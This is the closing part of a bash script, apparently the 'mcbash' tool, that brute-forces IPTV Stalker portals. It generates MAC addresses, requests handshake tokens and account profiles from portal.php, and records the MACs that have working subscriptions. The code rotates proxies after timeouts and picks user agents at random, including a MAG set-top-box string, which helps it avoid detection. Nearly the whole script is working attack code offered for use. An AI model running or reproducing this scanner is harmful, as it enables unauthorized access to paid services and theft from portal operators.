		elif [[ $total_timeout_number -ge $total_timeout_limit && \
			$total_timeout_limit -ne 0 ]]; then
			update_proxy
			consecutive_timeout_number=0
			total_timeout_number=0
		fi
	fi
}

request_is_a_timeout() {
	consecutive_timeout_number=$(( $consecutive_timeout_number + 1 ))
	total_timeout_number=$(( $total_timeout_number + 1 ))
	#last_request_timedout=true
	mac_not_changed=true
	check_if_timeout_limit
	if ! [[ -n ${only_outputs_mac} ]]; then
		echo -ne "${_ERASE}${_BLUE}Timeout [$total_timeout_number] (consecutive:$consecutive_timeout_number). New attempt in $timebreak_duration seconds.${_RESET}"
	fi
	sleep $timebreak_duration
	if ! [[ -n ${only_outputs_mac} ]]; then
		echo -ne "${_ERASE}${_ERASE}${_BLUE}New attempt...${_RESET}"
	fi
}

check_curl_exit_code() {
	# Function that returns 1 if curl failed, else 0
	curl_exit=$?
	if [ $curl_exit -eq 28 ]; then
		request_is_a_timeout
		return 1
	elif [ $curl_exit -eq 5 ]; then
		echo -e "\t${_DIM}curl could not resolve proxy.${_RESET}" # TODO
		mac_not_changed=true
		consecutive_timeout_number=$consecutive_timeout_limit
		total_timeout_number=$total_timeout_limit
		return 1
	elif [ $curl_exit -ne 0 ]; then
		echo -e "\t${_DIM}curl exit code : $curl_exit.${_RESET}" #TODO
		mac_not_changed=true
		consecutive_timeout_number=$consecutive_timeout_limit
		total_timeout_number=$total_timeout_limit
		return 1
	fi
	return 0
}

get_handshake() {
	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
	random_user_agent

	handshake_token=$(curl $debug_verbose_curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if ! check_curl_exit_code; then return 1; fi

	if [[ -n ${debug} ]]; then
		echo -e "\n---------------------------------\n\t${_YELLOW}Handshake token : ${_RESET}${_BLUE}${handshake_token:-Empty}${_RESET}"
	fi

	if [[ $(echo "$handshake_token" | grep -Eio "error code|unauthorized|502 bad gateway|maximum number of open connections reached|just a moment|500 internal server error|error") ]]; then
		#echo "contains error"
		mac_not_changed=true
		return 1
	fi

	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')

	if handshake_token_is_empty; then
		return 1
	fi
}

get_profile() {
	authorization='Bearer '$(echo $handshake_token)
	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
	profile=$(curl $debug_verbose_curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if ! check_curl_exit_code; then return 1; fi

	if [[ $profile == "" ]]; then
		maybeGEN1portal=true
		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac)
		profile=$(curl $debug_verbose_curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if ! check_curl_exit_code; then return 1; fi
	fi

	if [[ $profile == "" ]]; then
		unset maybeGEN1portal
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}"
		fi
		return 1 # test
	fi

	if [[ -z ${maybeGEN1portal+x} ]]; then
		account_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
		account=$(curl $debug_verbose_curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $account_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
		if ! [[ $account == "" ]]; then
			if [[ -n ${debug} ]]; then
				echo -e "${_YELLOW}ACCOUNT : ${_RESET}${_BLUE}${account}${_RESET}"
				echo -e "${_YELLOW}PROFILE1 : ${_RESET}${_BLUE}${profile}${_RESET}"
			fi
			profile=$account
		fi
	fi

	if [[ -n ${debug} ]]; then
		echo -e "${_YELLOW}PROFILE2 : ${_RESET}${_BLUE}${profile}${_RESET}"
	fi
}

get_exp_date() {
	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')

	if [[ -n ${debug} ]]; then
		echo -e "${_YELLOW}EXP_DATE : ${_RESET}${_BLUE}${expiration_date}${_RESET}"
	fi

	if [[ -z ${expiration_date} && -z ${keep_expired+x} ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}"
		fi
		return 1
	fi

	if [[ -z ${expiration_date} && -n ${keep_expired} ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n"
		fi
		if [[ $valid_macs_number == 0 ]]; then
			echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
		fi
		echo "$mac [expired]" >> $destination/valid_macs_$name
		return 1
	fi
}

scanning() {
	if [[ -n ${mac_not_changed} ]]; then
		last_request_failed
	else
		consecutive_timeout_number=0
		if ! [[ $item == 0 ]]; then
			check_if_time_to_stop
			check_if_timebreak
		fi
		item=$(( $item + 1 ))
		generate_mac
	fi

	if ! get_handshake; then return; fi
	if ! get_profile; then return; fi
	if ! get_exp_date; then return; fi

	valid_mac_found
	unset maybeGEN1portal
}

random_user_agent() {
	list_user_agent=("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" \
		"Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0" \
		"Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0" \
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0" \
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0" \
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0" \
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" \
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0" \
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393")
	user_agent=$(echo ${list_user_agent[RANDOM%9]})
}

check_dependencies
load_config_file
locate_destination_folder
read_args "$@"

[[ -n ${only_outputs_mac} ]] || display_logo

dns_name
check_parameters

[[ -n ${only_outputs_mac} ]] || scanning_text

item=0
valid_macs_number=0
timeout_number=0
stty -echoctl # Hide ^C when pressing Ctrl+C

while :
do
	scanning
	trap quit_mcbash SIGINT
done
# Dependencies :  NAME : PACKAGE TO INSTALL
# - tput : core/ncurses
# - curl : core/curl
# - echo : core/utils


# 
# dougy147 [2022]
# https://github.com/dougy147/mcbash
# last updated : 23sep2023
